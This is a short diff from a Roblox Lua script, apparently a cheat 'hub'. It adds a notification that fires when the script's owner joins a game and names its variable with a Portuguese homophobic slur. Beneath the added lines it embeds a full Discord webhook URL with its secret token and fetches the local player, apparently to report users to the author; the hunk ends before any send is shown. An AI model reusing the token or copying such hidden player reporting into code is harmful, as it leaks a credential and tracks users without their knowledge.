@@ -448,6 +448,17 @@ end)
 end
 end
 
+game:GetService("Players").PlayerAdded:Connect(function(viado)
+if viado.Name == "16kx_Mc" then
+game:GetService("StarterGui"):SetCore("SendNotification",{
+Title = "AstralnicHub",
+Text = "Dono do Script entrou > 16kx_Mc",
+Icon = "rbxassetid://12588581152"
+})
+end
+end)
+
+
 local v16 = "https://discord.com/api/webhooks/"
 local v17 = v16.."1076894140681429093/_W5CbM7EuW4B3KQPcoO08iA_ra6i6EfbujA4_gyCnnmHJkukyN40X5iue_qFUiNYikwh"
 local nm = game:GetService("Players").LocalPlayer
